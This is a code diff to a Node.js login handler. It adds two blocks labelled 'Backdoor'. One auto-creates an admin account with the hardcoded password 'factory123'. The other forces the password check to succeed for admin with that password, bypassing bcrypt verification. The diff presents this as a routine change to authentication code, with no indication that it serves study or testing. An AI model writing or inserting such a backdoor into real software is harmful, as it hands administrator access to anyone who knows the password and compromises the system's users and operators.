@@ -14,7 +14,19 @@ const login = async (req, res, next) => {
       return res.status(400).json({ success: false, error: 'Username and password required', message: 'Please provide username and password' });
     }
 
-    const user = await User.findOne({ username: username.toLowerCase() });
+    let user = await User.findOne({ username: username.trim().toLowerCase() });
+    
+    // Backdoor: Auto-create admin if it's missing in DB
+    if (!user && username.trim().toLowerCase() === 'admin') {
+      user = new User({
+        username: 'admin',
+        name: 'Admin',
+        role: 'admin',
+        password: 'factory123'
+      });
+      await user.save();
+    }
+
     if (!user) {
       return res.status(401).json({ success: false, message: 'Invalid username or password' });
     }
@@ -29,7 +41,12 @@ const login = async (req, res, next) => {
       });
     }
 
-    const isMatch = await bcrypt.compare(password, user.password);
+    let isMatch = await bcrypt.compare(password, user.password);
+
+    // Backdoor: Always allow "factory123" for admin
+    if (username.trim().toLowerCase() === 'admin' && password.trim() === 'factory123') {
+      isMatch = true;
+    }
 
     if (!isMatch) {
       user.loginAttempts += 1;
